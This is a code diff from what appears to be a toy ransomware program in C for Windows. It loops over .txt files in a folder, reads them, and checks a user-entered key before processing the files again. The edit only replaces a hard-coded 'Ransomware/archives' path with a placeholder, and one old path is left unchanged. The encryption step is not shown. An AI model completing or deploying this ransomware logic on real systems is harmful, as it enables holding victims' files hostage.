@@ -16,8 +16,8 @@ HANDLE hFindNext;
 WIN32_FIND_DATA FileInfo;
 
 int main(void){
-    hFindFirst = FindFirstFile("C:/Users/User/Ransomware/archives/*.txt", &FileInfo);
-    sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
+    hFindFirst = FindFirstFile("C:/[Directory]/*.txt", &FileInfo);
+    sprintf(file, "C:/[Directory]/%s", FileInfo.cFileName);
     hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
     CloseHandle(hFile);
@@ -29,7 +29,7 @@ int main(void){
     CloseHandle(hFile);
     for (int i = 0; i < 10; i++){
         FindNextFile(hFindFirst, &FileInfo);
-        sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
+        sprintf(file, "C:/[Directory]/%s", FileInfo.cFileName);
         hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
         CloseHandle(hFile);
@@ -48,7 +48,7 @@ int main(void){
     scanf("%s", &input);
     if (strcmp(input, key) == 0){
                       hFindFirst = FindFirstFile("C:/Users/User/Ransomware/archives/*.txt", &FileInfo);
-                      sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
+                      sprintf(file, "C:/[Directory]/%s", FileInfo.cFileName);
                       hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                       ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
                       CloseHandle(hFile);
@@ -60,7 +60,7 @@ int main(void){
                       CloseHandle(hFile);
                       for (int i = 0; i < 10; i++){
                               FindNextFile(hFindFirst, &FileInfo);
-                              sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
+                              sprintf(file, "C:/[Directory]/%s", FileInfo.cFileName);
                               hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                               ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
                               CloseHandle(hFile);
